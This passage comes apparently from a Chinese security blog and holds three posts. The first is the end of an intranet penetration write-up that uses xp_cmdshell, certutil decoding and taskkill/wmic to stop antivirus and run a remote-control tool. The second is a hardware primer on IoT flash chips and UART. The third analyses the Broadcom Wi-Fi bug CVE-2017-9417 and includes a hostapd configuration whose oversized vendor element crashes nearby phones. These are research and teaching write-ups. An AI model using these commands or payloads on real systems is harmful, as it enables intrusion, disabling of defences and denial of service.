<p>apache环境并没有装php，无法执行php脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic process where name=<span class="string">"httpd.exe"</span> get processid,executablepath,name</div><div class="line">其他中间件或web服务的也可以根据运行程序的路径，查看其配置文件，使用wmic命令查看运行路径:</div></pre></td></tr></table></figure></p>
<p>上远控，远控怎么上传上去呢？于是找到这篇文章<a href="http://www.91ri.org/17255.html" rel="external nofollow noopener noreferrer" target="_blank">《15种文件下载的方式》</a><br>    再win2k3上面能用的，就剩下ftp、vbs、Bitsadmin、smb、c#、hex<br>        vbs和smb都被安全狗限制无法利用<br>        c#编译成功了，但是无法下载，貌似也被限制了<br>        bitsadmin不存在此命令<br>        FTP批量处理下载，C1上面有一个FTP，也是无法成功下载<br>        hex太长转换麻烦，暂时不考虑<br>    刚刚最近国外有大神提到了certutil命令，本地测试了一下，下载的文件无法指定路径，也不能正常保存，故又放弃了此路，详情可以参考这篇<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/" rel="external nofollow noopener noreferrer" target="_blank">文章</a>，win2k3保存有问题</p>
<h2 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h2><p> 经过尝试各种下载姿势，还是无法下载，想了很久，又回到了certutil，因为他是系统自带的命令，从win2k3道windows 2016都是存在的，既可以用于下载，也可以用于base64编码和文件hash校验。故此：<br>通过certutil将生成的exe转换为base64编码，利用echo命令写入到文本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 文件hash</div><div class="line">(<span class="number">1</span>) SHA1</div><div class="line">certutil.exe -hashfile msg.dll</div><div class="line">(<span class="number">2</span>) SHA256：</div><div class="line">certutil.exe -hashfile msg.dll SHA256</div><div class="line">(<span class="number">3</span>) MD5：</div><div class="line">certutil.exe -hashfile msg.dll MD5</div><div class="line"><span class="number">2.</span>编码</div><div class="line">(<span class="number">1</span>) base64编码：</div><div class="line">CertUtil -encode InFile OutFile</div><div class="line">(<span class="number">2</span>) base64解码</div><div class="line">CertUtil -decode InFile OutFile</div><div class="line">注：编码后的文件会添加两处标识信息，不影响文件解码</div><div class="line">文件头：</div><div class="line">-----BEGIN CERTIFICATE-----</div><div class="line">文件尾：</div><div class="line">-----END CERTIFICATE-----</div></pre></td></tr></table></figure></p>
<p>mssql查询分析器批量echo文本保存<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"echo xxxx &gt;&gt; C:\temp\test.txt"</span></div></pre></td></tr></table></figure></p>
<p> 使用certutil还原exe可以还原为txt，因为exe无法写入，并使用其校验文件hash<br>结束相关杀软进程和服务，这里提一点，因为C2的360是自动启动的，所以需要禁用自启，由于sc无法使用，我们可以使用wmic替代：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"taskkill /im 360* /t /f"</span></div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360EntClientSvc' call stopservice"</span></div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360rp' call stopservice"</span></div></pre></td></tr></table></figure></p>
<p>最后运行解码的exe即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CertUtil -decode test.txt xshell.txt</div><div class="line">wmic process call create <span class="string">'c:\temp\xshell.txt'</span></div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 本次渗透，可以说是一波三折，主要学习到的东西是在复杂环境下，综合利用各种windows自带的工具进行绕过安全防护，如wmic、taskkill、certutil等综合运用，才得以绕过杀软的防御，也存在一定运气的成分如数据库弱口令、病毒库更新不及时等。 从防御的角度来看的话：<br>1、加强日常安全运维的巡检，其实我的exe上传不止一次被杀或这被拦截，如果巡检自然可以发现<br>2、提高安全运维人员意识，做好安全策略管理，如数据库弱口令这些本不该有的<br>3、及时更新防病毒软件和恶意代码库，新版的360没法结束<br>4、加强对外恶意流量的安全检测，如DNS、http等</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt; 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="内网渗透" scheme="http://www.future-sec.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-硬件分析初探</title>
    <link href="http://www.future-sec.com/iot-security-hardware-analysis.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-analysis.html</id>
    <published>2017-11-16T16:00:00.000Z</published>
    <updated>2017-12-26T03:01:45.419Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。</p>
<h2 id="电路识别"><a href="#电路识别" class="headerlink" title="电路识别"></a>电路识别</h2><p>在对电路进行分析之前，需要对PCB电路图和电子元器件知识有简单的了解。<br>PCB（ Printed Circuit Board），中文名称为印制电路板，又称印刷线路板，是重要的电子部件，是电子元器件的支撑体，是电子元器件电气连接的载体。由于它是采用电子印刷术制作的，故被称为“印刷”电路板。<br><img src="/images/image11.jpg" alt="img"><br><img src="/images/image12.jpg" alt="img"><br><img src="/images/image13.jpg" alt="img"></p>
<h2 id="电子元器件"><a href="#电子元器件" class="headerlink" title="电子元器件"></a>电子元器件</h2><p>电子元件有着不同的封装类型，不同类的元件外形一样，但内部结构及用途是大不一样的，比如TO220封装的元件可能是三极管、可控硅、场效应管、或双二极管。TO-3封装的元件有三极管，集成电路等。二极管也有几种封装，玻璃封装、塑料封装及螺栓封装，二极管品种有稳压二极管、整流二极管、隧道二极管、快恢复二极管、微波二极管、肖特基二极管等，这些二极管都用一种或几种封装。贴片元件由于元件微小有的干脆不印字常用尺寸大多也就几种，所以没有经验的人很难区分，但贴片二极管及有极性贴片电容与其它贴片则很容易区分，有极性贴片元件有一个共同的特点，就是极性标志。对于元件识别可以看印字型号来区别，对于元件上没有字符的器件也可分析电路原理或用万用表测量元件参数进行判断。判断元件类型并非一朝一夕就能学会的，这需要多年积累的经验来认识。<br><img src="/images/image14.jpg" alt="img"><br><img src="/images/image15.jpg" alt="img"><br><img src="/images/image16.jpg" alt="img"></p>
<h2 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h2><p>在对PCB和电子元器件有一定认知后，就可以开始分析其工作原理和芯片了，常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。<br>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。<br>常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。<br>在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。<br><img src="/images/image17.jpg" alt="img"><br><img src="/images/image18.jpg" alt="img"><br><img src="/images/image19.jpg" alt="img"></p>
<h2 id="Flash芯片"><a href="#Flash芯片" class="headerlink" title="Flash芯片"></a>Flash芯片</h2><p>FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。<br><img src="/images/image20.jpg" alt="img"><br><img src="/images/image21.jpg" alt="img"><br><img src="/images/image22.jpg" alt="img"><br>     根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。<br>      其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。<br>      我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。<br><img src="/images/image23.jpg" alt="img"><br><img src="/images/image24.jpg" alt="img"></p>
<h2 id="芯片印字"><a href="#芯片印字" class="headerlink" title="芯片印字"></a>芯片印字</h2><p>一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。<br> 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下：<br>       <img src="/images/image25.jpg" alt="img"></p>
<h2 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h2><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。<br>并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。<br>编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。<br><img src="/images/image26.jpg" alt="img"><br><img src="/images/image27.jpg" alt="img"><br><img src="/images/image28.jpg" alt="img"></p>
<h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。<br>        RS-232通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。<br>        RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。<br>        RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。<br><img src="/images/image29.jpg" alt="img"><br><img src="/images/image30.jpg" alt="img"><br><img src="/images/image31.jpg" alt="img"></p>
<h2 id="UART调试"><a href="#UART调试" class="headerlink" title="UART调试"></a>UART调试</h2><p>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br>在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。<br><img src="/images/image32.jpg" alt="img"><br><img src="/images/image33.jpg" alt="img"></p>
<h2 id="设备拆解"><a href="#设备拆解" class="headerlink" title="设备拆解"></a>设备拆解</h2><p>对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：<br><img src="/images/image103.jpg" alt="img"><br><img src="/images/image104.jpg" alt="img"><br>维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，手电筒用来观察芯片印字和PCB走线，PCB测试夹用来夹住某些难以焊接的焊点，排线用来连接各类电子设备，热风枪和焊枪用来拆焊和锡焊。</p>
<h2 id="常见物联网智能设备"><a href="#常见物联网智能设备" class="headerlink" title="常见物联网智能设备"></a>常见物联网智能设备</h2><p><img src="/images/image105.jpg" alt="img"><br>共享充电宝，采用gprs模块配合物联卡与云端通信</p>
<p><img src="/images/image106.jpg" alt="img"><br>蓝牙挂锁，通过蓝牙芯片与手机配对通信，<br>蓝牙控制电机驱动，使卡锁运转</p>
<p><img src="/images/image107.jpg" alt="img"><br>共享充电宝，采用GSM模块加蓝牙模块控制通信</p>
<p><img src="/images/image108.jpg" alt="img"><br>智能锁，WIFI芯片加蓝牙芯片配合控制<br>，外接指纹识别传感器</p>
<p><img src="/images/image109.jpg" alt="img"><br>智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块</p>
<p><img src="/images/image110.jpg" alt="img"><br>网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块</p>
<p><img src="/images/image111.jpg" alt="img"><br>智能路由器，高容量内存搭配智能OS</p>
<p><img src="/images/image112.jpg" alt="img"><br>智能家居控制终端，高性能WIFI收发中继控制</p>
<p><img src="/images/image113.jpg" alt="img"><br>智能保险柜，采用WIFI芯片控制加指纹识别传感器</p>
<p><img src="/images/image114.jpg" alt="img"><br>无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端</p>
<h2 id="读取芯片"><a href="#读取芯片" class="headerlink" title="读取芯片"></a>读取芯片</h2><p>为了读取Flash芯片的内容，有以下三个基本途径：<br>（1）直接将导线连接到芯片的引脚，在通过导线连接编程器读取固件；<br>（2）把芯片拆下来，在连接编程器读取固件。<br>（3）连接TXD、RXD调试PIN，通过UART串口转接读取固件。<br>根据Flash芯片的封装方式和电路设计不同，需要灵活采用不同的方式。</p>
<p><img src="/images/image34.jpg" alt="img"><br><img src="/images/image35.jpg" alt="img"></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.china-cic.cn/" rel="external nofollow noopener noreferrer" target="_blank">http://www.china-cic.cn/</a>  中国通信协会相关文献<br>  <a href="https://www.eia.gov/" rel="external nofollow noopener noreferrer" target="_blank">https://www.eia.gov/</a>  美国电子工业协会相关标准</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>BROADCOM WI-FI芯片漏洞分析二</title>
    <link href="http://www.future-sec.com/broadcom-wifi-2.html"/>
    <id>http://www.future-sec.com/broadcom-wifi-2.html</id>
    <published>2017-08-29T16:00:00.000Z</published>
    <updated>2017-12-21T07:33:35.154Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
<ol>
<li>下载hostapd到ubuntu 14.04</li>
<li>解压hostapd</li>
<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
</li>
</ol>
<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。&lt;br&gt;1
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
